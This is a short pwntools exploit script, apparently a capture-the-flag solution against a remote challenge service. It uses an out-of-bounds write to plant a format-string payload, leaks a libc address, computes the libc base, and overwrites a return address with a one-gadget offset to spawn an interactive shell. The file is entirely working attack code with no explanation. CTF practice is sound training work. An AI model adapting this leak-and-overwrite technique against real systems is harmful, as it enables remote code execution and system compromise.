from pwn import *

p = remote("challenges1.hexionteam.com", 3002)

fmt = "%29$lx "

main = p64(0x000000000040056e) + p64(0x400778)

p.sendline("-7")
p.sendline(p8(len(fmt)+len(main)))

for i in range(len(fmt)):
	p.sendline(str(i))
	p.sendline(fmt[i])

for i in range(len(main)):
	p.sendline(str(45+i))
	p.sendline(main[i])


libc_leak = int(p.recv(1024).split()[0],16)

libc_base = libc_leak - 0x401733

log.info("Libc Leak: " + hex(libc_base))

win = p64(libc_base + 0x4f2c5)
p.sendline("-7")
p.sendline(p8(len(win)))

for i in range(len(win)):
	p.sendline(str(45+i))
	p.sendline(win[i])


p.interactive()